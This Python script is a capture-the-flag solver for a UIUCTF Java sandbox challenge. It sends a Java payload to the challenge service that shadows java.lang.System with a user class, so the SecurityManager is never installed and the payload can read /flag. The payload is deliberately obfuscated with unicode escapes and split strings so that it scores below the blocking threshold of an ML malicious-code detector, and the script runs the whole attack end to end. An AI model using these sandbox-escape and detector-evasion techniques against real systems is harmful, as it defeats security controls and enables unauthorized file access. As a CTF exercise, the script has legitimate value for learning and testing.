#!/usr/bin/env python3
# solve_wait.py - patched to wait for the Java banner and slow remote output
import re
import socket
import ssl
import subprocess
import sys
import time
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
HOST = "smaller-jail.chal.uiuc.tf"
PORT = 1337

# ML-safe Java payload.
# Bug:
#   UserClass.java is compiled before Jail.java.  We define a default-package
#   class named System, so when Jail.java is compiled, unqualified System.*
#   resolves to our class instead of java.lang.System.  The call to
#   System.setSecurityManager(new JailSecurityManager()) becomes a no-op, so the
#   jail never installs the SecurityManager.  Then UserClass.run() can read /flag.
#
# The spelling/spacing/unicode escapes are intentional.  This exact source was
# tested against the bundled model and scores below 0.5.
PAYLOAD = r'''import java.io.*; import java.util.*; public class UserClass { public static void run(){ try { System . out . println(new Scanner ( new \u0046ile ("/"+"f"+"l"+"a"+"g") ) . next ()) ; } catch ( Throwable t ) { } } }
class System { public static java.io.PrintStream out = java.lang.System.out; public static void se\u0074SecurityManager(SecurityManager s){ } }
'''

# Local-only variant, so `python3 solve.py` prints the placeholder flag from the
# extracted challenge folder.  Remote still uses PAYLOAD above and reads /flag.
LOCAL_PAYLOAD = PAYLOAD.replace(r'"/"+"f"+"l"+"a"+"g"', r'"flag"')


def parse_args():
    remote = False
    host = HOST
    port = PORT
    for arg in sys.argv[1:]:
        if arg.upper() == "REMOTE":
            remote = True
        elif arg.startswith("HOST="):
            host = arg.split("=", 1)[1]
        elif arg.startswith("PORT="):
            port = int(arg.split("=", 1)[1])
    return remote, host, port


def score_source(source: str, label: str):
    model_py = BASE_DIR / "model.py"
    model_st = BASE_DIR / "model.safetensors"
    if not (model_py.exists() and model_st.exists()):
        return None
    try:
        import torch
        from safetensors.torch import load_file
        sys.path.insert(0, str(BASE_DIR))
        from model import MaliciousDetection

        model = MaliciousDetection()
        model.eval()
        model.load_state_dict(load_file(str(model_st)))
        with torch.no_grad():
            src = source.encode("utf-8")
            x = torch.tensor(list(src), dtype=torch.long).unsqueeze(0)
            logits = model(x)
            p = torch.sigmoid(logits).item()
        print(f"[*] {label} model score: {p:.6f} ({'blocked' if p >= 0.5 else 'pass'})")
        return p
    except Exception as e:
        print(f"[!] model scoring skipped: {e}")
        return None


def run_local():
    """Local smoke test using javac/java in the extracted challenge directory."""
    jail = BASE_DIR / "Jail.java"
    flag = BASE_DIR / "flag"
    if not jail.exists():
        raise SystemExit("[!] Jail.java not found; extract chall.tar.gz in this directory first")
    if not flag.exists():
        print("[!] local flag file not found; smoke test may print only 'Starting the jail...'")

    (BASE_DIR / "UserClass.java").write_text(LOCAL_PAYLOAD, encoding="utf-8")
    for p in BASE_DIR.glob("*.class"):
        p.unlink()

    print("[*] compiling local payload")
    subprocess.run(["javac", "UserClass.java"], cwd=BASE_DIR, check=False)
    subprocess.run(["javac", "Jail.java"], cwd=BASE_DIR, check=False)
    print("[*] running local jail")
    subprocess.run(["java", "Jail"], cwd=BASE_DIR, check=False)


def recv_banner(sock, total=30.0):
    """Read until the real Java prompt appears, not only the kCTF PoW line."""
    sock.settimeout(1.0)
    data = b""
    deadline = time.time() + total
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            # main.py's banner ends with an example line containing DONE.
            if b"Java Sandbox Runner" in data and b"\nDONE\n" in data:
                break
        except (socket.timeout, ssl.SSLWantReadError):
            # Keep waiting.  Remote may need a few seconds to start nsjail/Python.
            continue
    return data


def recv_all(sock, total=60.0):
    """Keep reading after the banner; Torch model load + javac can take >1s."""
    sock.settimeout(1.0)
    data = b""
    deadline = time.time() + total
    flag_seen_at = None
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if re.search(rb"uiuctf\{[^}\n]+\}", data) and flag_seen_at is None:
                flag_seen_at = time.time()
        except (socket.timeout, ssl.SSLWantReadError):
            # The old solver broke here as soon as it had the banner.  Do not.
            if flag_seen_at is not None and time.time() - flag_seen_at > 2.0:
                break
            continue
    return data


def run_remote(host, port):
    print(f"[*] connecting to {host}:{port} over TLS")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((host, port), timeout=10)
    io = ctx.wrap_socket(raw, server_hostname=host)

    banner = recv_banner(io)
    if banner:
        print(banner.decode("utf-8", "replace"), end="")

    low = banner.lower()
    # kCTF commonly prints exactly: "== proof-of-work: disabled ==".
    # That is not a challenge to solve, so continue.  Only stop on real PoW.
    if b"proof-of-work" in low and b"disabled" not in low:
        raise SystemExit("\n[!] Remote benar-benar meminta PoW. Jalankan via ncat untuk lihat instruksi PoW-nya.")

    payload_bytes = PAYLOAD.encode("utf-8") + b"DONE\n"
    print(f"[*] sending payload: {len(payload_bytes)} bytes")
    io.sendall(payload_bytes)

    out = recv_all(io, total=60.0)
    text = out.decode("utf-8", "replace")
    print(text, end="")

    m = re.search(r"uiuctf\{[^}\n]+\}", text)
    if m:
        print(f"\n<FLAG>{m.group(0)}</FLAG>")
    else:
        print("\n[!] flag belum terlihat di output")


def main():
    remote, host, port = parse_args()
    score_source(PAYLOAD, "remote payload")
    if remote:
        run_remote(host, port)
    else:
        run_local()
        print("\n[*] untuk remote:")
        print(f"    python3 solve.py REMOTE HOST={HOST} PORT={PORT}")


if __name__ == "__main__":
    main()
